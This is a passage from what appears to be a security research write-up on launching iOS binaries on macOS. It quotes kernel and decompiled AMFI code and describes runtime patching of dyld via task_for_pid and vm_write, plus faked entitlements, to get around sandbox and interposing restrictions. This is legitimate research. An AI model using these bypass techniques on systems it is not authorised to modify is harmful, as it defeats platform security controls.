class="c3"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; error = EACCES;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; goto done;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} else if (psa-&amp;gt;psa_platform != PLATFORM_IOS) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/* Simulator binary spawned with wrong platform */&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;signature_failure_reason = os_reason_create(OS_REASON_EXEC,&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c11 c14"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c14"&gt;EXEC_EXIT_REASON_WRONG_PLATFORM&lt;/span&gt;&lt;span class="c3"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;error = EACCES;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;goto done;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c11 c14"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} else {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;printf(&amp;quot;Allowing spawn of iOS binary %s since&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; correct platform was passed in spawn\n&amp;quot;, p-&amp;gt;p_name);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;#endif /* XNU_TARGET_OS_OSX */&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;hellip;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This code is active on macOS and will execute if the platform of the to-be-executed process is &lt;/span&gt;&lt;span class="c11"&gt;PLATFORM_IOS&lt;/span&gt;&lt;span&gt;. In essence, the code checks for an undocumented &lt;/span&gt;&lt;span class="c11"&gt;posix_spawn&lt;/span&gt;&lt;span&gt;&amp;nbsp;attribute, &lt;/span&gt;&lt;span class="c11"&gt;psa_platform&lt;/span&gt;&lt;span&gt;, and in the absence of it (or if its value is not &lt;/span&gt;&lt;span class="c11"&gt;PLATFORM_IOS&lt;/span&gt;&lt;span&gt;), will terminate the process in the way we have previously observed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As such, to avoid &lt;/span&gt;&lt;span class="c11"&gt;EXEC_EXIT_REASON_WRONG_PLATFORM&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;it should only be necessary to use the undocumented &lt;/span&gt;&lt;span class="c7 c11"&gt;&lt;a class="c101" href="https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/libsyscall/wrappers/spawn/posix_spawn.c#L1073"&gt;posix_spawnattr_set_platform_np&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall to set the target platform to &lt;/span&gt;&lt;span class="c11"&gt;PLATFORM_IOS&lt;/span&gt;&lt;span&gt;, then invoke &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://man7.org/linux/man-pages/man3/posix_spawn.3.html"&gt;posix_spawn&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;to execute the iOS binary:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; posix_spawnattr_t attr;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; posix_spawnattr_init(&amp;amp;attr);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; posix_spawnattr_set_platform_np(&amp;amp;attr, PLATFORM_IOS, 0);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; posix_spawn(&amp;amp;pid, binary_path, NULL, &amp;amp;attr, argv, environ);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;Doing that will now result in:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;gt; ./runner hello&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;[*] Child exited with status 5&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;No more SIGKILL, progress! Exit status 5 corresponds to SIGTRAP, which likely implies that the process is now terminating in userspace. And indeed, the crash report confirms that the process is crashing sometime during library initialization now.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c9" id="h.p4xsg0nqawvp"&gt;&lt;span class="c12"&gt;Userspace&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;At this point we have a &lt;/span&gt;&lt;span class="c11"&gt;PLATFORM_IOS&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;process running in macOS userspace. The next thing that now happens is that &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://en.wikipedia.org/wiki/Dynamic_linker"&gt;dyld&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the dynamic linker, starts mapping all libraries that the binary depends on and executes any initializers they might have. Unfortunately, one of the first libraries now being initialized, &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit.dylib&lt;/span&gt;&lt;span&gt;, tries to determine whether it should initialize the app sandbox based on the binary&amp;rsquo;s platform and its &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/bundleresources/entitlements"&gt;entitlements&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;. The logic is roughly:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;initialize_app_sandbox = False&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;if entitlement(&amp;ldquo;com.apple.security.app-sandbox&amp;rdquo;) == True:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; initialize_app_sandbox = True&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;if active_platform() == PLATFORM_IOS &amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp;entitlement(&amp;ldquo;com.apple.private.security.no-sandbox&amp;rdquo;) != True:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; initialize_app_sandbox = True&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As such, &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit&lt;/span&gt;&lt;span&gt;&amp;nbsp;will decide that it should initialize the app sandbox and will then contact &lt;/span&gt;&lt;span class="c11"&gt;secinitd(8)&lt;/span&gt;&lt;span&gt;, &amp;ldquo;the security policy initialization daemon&amp;rdquo;, to obtain a sandbox profile. As that daemon cannot determine the app corresponding to the process in question it will fail, and &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit.dylib&lt;/span&gt;&lt;span&gt;&amp;nbsp;will then &lt;/span&gt;&lt;span class="c11"&gt;abort(3)&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;the process:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;(lldb) bt&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;* thread #1, queue = &amp;#39;com.apple.main-thread&amp;#39;, stop reason = EXC_BREAKPOINT&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; * frame #0: libsystem_secinit.dylib`_libsecinit_appsandbox.cold.5&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #1: libsystem_secinit.dylib`_libsecinit_appsandbox&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #2: libsystem_trace.dylib` ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #3: libsystem_secinit.dylib`_libsecinit_initializer&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #4: libSystem.B.dylib`libSystem_initializer&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #5: libdyld.dylib`...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #6: libdyld.dylib`...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #7: libdyld.dylib`dyld3::AllImages::runLibSystemInitializer&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #8: libdyld.dylib`...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #9: dyld`...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #10: dyld`dyld::_main&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #11: dyld`dyldbootstrap::start&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; frame #12: dyld`_dyld_start + 56&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;As a side note, logic like the above will turn out to be a somewhat common theme: various components responsible for the runtime environment will have special handling for iOS binaries, in which case they tend to enforce various policies more aggressively.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One possible way to solve this would be to sign the iOS binary with a &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://support.apple.com/guide/keychain-access/create-self-signed-certificates-kyca8916/mac"&gt;self-signed (and locally trusted) code signing certificate&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and granting it the &amp;ldquo;com.apple.private.security.no-sandbox&amp;rdquo; entitlement. This would then cause &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit&lt;/span&gt;&lt;span&gt;&amp;nbsp;to not attempt to initialize the app sandbox. Unfortunately, it seems that while AppleMobileFileIntegrity (&amp;ldquo;amfi&amp;rdquo; - the OS component implementing various security policies like entitlement and code signing checks) will allow macOS binaries to be signed by locally-trusted code-signing certificates if SIP is disabled, it will not do so for iOS binaries. Instead, it appears to enforce roughly the same requirements as on iOS, namely that the binary must either be signed by Apple directly (in case the app is downloaded from the app store) or there must exist a valid (i.e. one signed by Apple) &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/appstoreconnectapi/profiles"&gt;provisioning profile&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;for the code-signing entity which explicitly allows the entitlements. As such, this path appears like a dead end.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Another way to work around the sandbox initialization would be to use &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://opensource.apple.com/source/dyld/dyld-97.1/include/mach-o/dyld-interposing.h.auto.html"&gt;dyld interposing&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to replace &lt;/span&gt;&lt;span class="c11"&gt;xpc_copy_entitlements_for_self&lt;/span&gt;&lt;span&gt;, which &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit&lt;/span&gt;&lt;span&gt;&amp;nbsp;invokes to obtain the process&amp;rsquo; entitlements, with another function that would simply return the &amp;ldquo;com.apple.private.security.no-sandbox&amp;rdquo; entitlement. This would in turn prevent &lt;/span&gt;&lt;span class="c11"&gt;libsystem_secinit&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;from attempting to initialize the sandbox.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Unfortunately, the iOS process is subject to further restrictions, likely part of the &amp;ldquo;&lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/security/hardened_runtime"&gt;hardened runtime&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;rdquo; suite, which causes dyld to disable library interposing (some more information on this mechanism is available &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;). This policy is also implemented by amfi, in AppleMobileFileIntegrity.kext (the kernel component of amfi):&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;__int64 __fastcall macos_dyld_policy_library_interposing(proc *a1, int *a2)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; int v3; // w8&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; v3 = *a2;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; if ( (v3 &amp;amp; 0x10400) == 0x10000 ) &amp;nbsp; // flag is set for iOS binaries&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; logDyldPolicyRejection(a1, &amp;quot;library interposing&amp;quot;, &amp;quot;Denying library interposing for iOS app\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; return 0LL;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; return 64LL;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As can be seen, AMFI will deny library interposing for all iOS binaries. Unfortunately, I couldn&amp;rsquo;t come up with a better solution for this than to patch the code of dyld at runtime to ignore AMFI&amp;rsquo;s policy decision and thus allow library interposing. Fortunately though, doing lightweight runtime code patching is fairly easy through the use of some classic &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c101" href="http://web.mit.edu/darwin/src/modules/xnu/osfmk/man/"&gt;mach APIs&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c8 lst-kix_ii04ufl4nr9k-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Find the offset of &lt;/span&gt;&lt;span class="c11"&gt;_amfi_check_dyld_policy_self&lt;/span&gt;&lt;span&gt;&amp;nbsp;in /usr/lib/dyld, e.g. with &lt;/span&gt;&lt;span class="c2"&gt;nm(1)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Start the iOS process with the &lt;/span&gt;&lt;span class="c11"&gt;POSIX_SPAWN_START_SUSPENDED&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;attribute so it is initially suspended (the equivalent of SIGSTOP). At this point, only dyld and the binary itself will have been mapped into the process&amp;rsquo; memory space by the kernel.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;&amp;ldquo;Attach&amp;rdquo; to the process using &lt;/span&gt;&lt;span class="c2"&gt;task_for_pid&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Find the location of dyld in memory through &lt;/span&gt;&lt;span class="c7 c11"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/kernel/1585424-vm_region_recurse_64"&gt;vm_region_recurse_64&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Map dyld&amp;rsquo;s code section writable using &lt;/span&gt;&lt;span class="c7 c11"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/kernel/1585294-vm_protect"&gt;vm_protect&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;(VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY)&lt;/span&gt;&lt;span&gt;&amp;nbsp;(where &lt;/span&gt;&lt;span class="c7 c11"&gt;&lt;a class="c101" href="https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/osfmk/mach/vm_prot.h#L116"&gt;VM_PROT_COPY&lt;/a&gt;&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;is seemingly necessary to force the pages to be copied since they are shared)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Patch &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;_amfi_check_dyld_policy_self&lt;/span&gt;&lt;span&gt;&amp;nbsp;through &lt;/span&gt;&lt;span class="c7 c11"&gt;&lt;a class="c101" href="https://developer.apple.com/documentation/kernel/1585462-vm_write"&gt;vm_write&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to simply return 0x5f (indicating that dyld interposing and other features should be allowed)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Map dyld&amp;rsquo;s code section executable again&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;To be able to use the &lt;/span&gt;&lt;span class="c11"&gt;task_for_pid&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;trap, the runner binary will either need the &amp;ldquo;com.apple.security.cs.debugger&amp;rdquo; entitlement or root privileges. However, as the runner is a macOS binary, it can be given this entitlement through a self-signed certificate which amfi will then allow.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;As such, the full steps necessary to launch an iOS binary on macOS are:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c8 lst-kix_kfxac5q5c62u-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Use the &lt;/span&gt;&lt;span class="c11"&gt;posix_spawnattr_set_platform_np&lt;/span&gt;&lt;span&gt;&amp;nbsp;API to set the target platform to &lt;/span&gt;&lt;span class="c2"&gt;PLATFORM_IOS&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Execute the new process via &lt;/span&gt;&lt;span class="c11"&gt;posix_spawn(2)&lt;/span&gt;&lt;span class="c6"&gt;&amp;nbsp;and start it suspended&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span class="c6"&gt;Patch dyld to allow library interposing&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;In the interposed library, claim to possess the com.apple.security.cs.debugger entitlement by replacing &lt;/span&gt;&lt;span class="c2"&gt;xpc_copy_entitlements_for_self&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c1 li-bullet-0"&gt;&lt;span&gt;Continue the process by sending it &lt;/span&gt;&lt;span class="c2"&gt;SIGCONT&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c6"&gt;This can now be seen in action:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c6"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; cat hello.c&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;int main() {&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; puts(&amp;quot;Hello from an iOS binary!&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; return 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;&amp;gt; clang -arch arm64 hello.c -o hello -isysroot \ &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c13"&gt;/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk 